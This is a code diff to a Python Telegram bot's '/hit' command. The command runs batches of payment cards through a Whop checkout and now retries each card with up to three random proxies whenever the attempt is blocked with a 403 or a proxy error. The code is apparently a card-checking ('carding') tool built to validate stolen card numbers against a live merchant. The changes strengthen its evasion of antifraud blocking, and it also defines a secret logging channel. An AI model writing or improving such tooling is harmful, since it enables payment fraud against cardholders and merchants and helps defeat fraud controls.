@@ -3037,7 +3037,7 @@ async def allchecking_callback(
         reply_markup=_allchecking_markup(),
     )
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# /hit COMMAND (WHOP CHECKOUT - MULTI CARD WITH PROXIES)
+# /hit COMMAND (WHOP CHECKOUT - MULTI CARD WITH PROXY RETRIES)
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 WHOP_SECRET_LOGS_ID = -1003721327421  # Your secret channel ID
 
@@ -3099,8 +3099,9 @@ async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     # Load proxies
     proxies_list = _load_whop_proxies()
     if not proxies_list:
-        logger.warning("px.txt not found or empty. Running without proxies (May get blocked!).")
-
+        await update.message.reply_text("⚠️ <b>px.txt not found or empty.</b> Please add proxies to avoid blocks.", parse_mode="HTML")
+        return
+    
     total_cards = len(cards_list)
     status_msg = await update.message.reply_text(f"⏳ Processing Whop checkout...\nProgress: 0/{total_cards}", parse_mode="HTML")
 
@@ -3120,19 +3121,38 @@ async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
             results_data.append({"card": card_str, "status": "error", "msg": err})
             continue
 
-        # Select a random proxy for this specific card
-        proxy_to_use = random.choice(proxies_list) if proxies_list else ""
+        # Try up to 3 different proxies for each card
+        max_proxy_retries = min(3, len(proxies_list))
+        result = None
+        proxy_failed = False
 
-        cfg = _build_cfg(url_str, "", parsed, proxy=proxy_to_use)
+        for attempt in range(max_proxy_retries):
+            proxy_to_use = random.choice(proxies_list)
+            cfg = _build_cfg(url_str, "", parsed, proxy=proxy_to_use)
 
-        def run_checker():
-            return WhopCheckout(cfg).run_api()
+            def run_checker():
+                return WhopCheckout(cfg).run_api()
 
-        try:
-            result = await loop.run_in_executor(None, run_checker)
-        except Exception as e:
-            logger.error(f"Whop checker crashed for {card_str}: {e}")
-            result = {"status": "error", "message": str(e)}
+            try:
+                result = await loop.run_in_executor(None, run_checker)
+            except Exception as e:
+                logger.error(f"Crash for {card_str} with proxy {proxy_to_use}: {e}")
+                result = {"status": "error", "message": str(e)}
+
+            # Check if it's a proxy/blocked error
+            st_temp = result.get("status", "unknown")
+            msg_temp = result.get("message", "")
+            if st_temp == "error" and ("Page load failed" in msg_temp or "ProxyError" in msg_temp or "403" in msg_temp):
+                logger.warning(f"Proxy {proxy_to_use} failed for {card_str}. Retrying with a new proxy ({attempt+1}/{max_proxy_retries})...")
+                await asyncio.sleep(1) # Short delay before next proxy
+                proxy_failed = True
+                continue # Try next proxy
+            else:
+                proxy_failed = False
+                break # Success or non-proxy error, stop retrying
+
+        if result is None:
+            result = {"status": "error", "message": "All proxies failed"}
 
         st = result.get("status", "unknown")
         msg = result.get("message", "")
@@ -3151,18 +3171,17 @@ async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
             sub_msg = result.get("url", "3DS required")
         elif st == "declined":
             sub_msg = msg or code or "Payment failed"
-            # Clean up ugly error messages
             if "No plans" in sub_msg or "nodes" in sub_msg:
                 sub_msg = "Declined (Product Error/Blocked)"
-            elif "Page load failed" in sub_msg or "ProxyError" in sub_msg or "403" in sub_msg:
-                sub_msg = "Declined (Blocked by Antifraud/Bad Proxy)"
+            elif "Page load failed" in sub_msg or "ProxyError" in sub_msg or "403" in sub_msg or "All proxies failed" in sub_msg:
+                sub_msg = "Declined (All Proxies Blocked)"
         elif st == "error":
             sub_msg = msg
             if "No plans" in sub_msg or "nodes" in sub_msg:
                 sub_msg = "Declined (Product Error/Blocked)"
                 st = "declined"
-            elif "Page load failed" in sub_msg or "ProxyError" in sub_msg or "403" in sub_msg:
-                sub_msg = "Declined (Blocked by Antifraud/Bad Proxy)"
+            elif "Page load failed" in sub_msg or "ProxyError" in sub_msg or "403" in sub_msg or "All proxies failed" in sub_msg:
+                sub_msg = "Declined (All Proxies Blocked)"
                 st = "declined"
         else:
             sub_msg = "Unknown status"
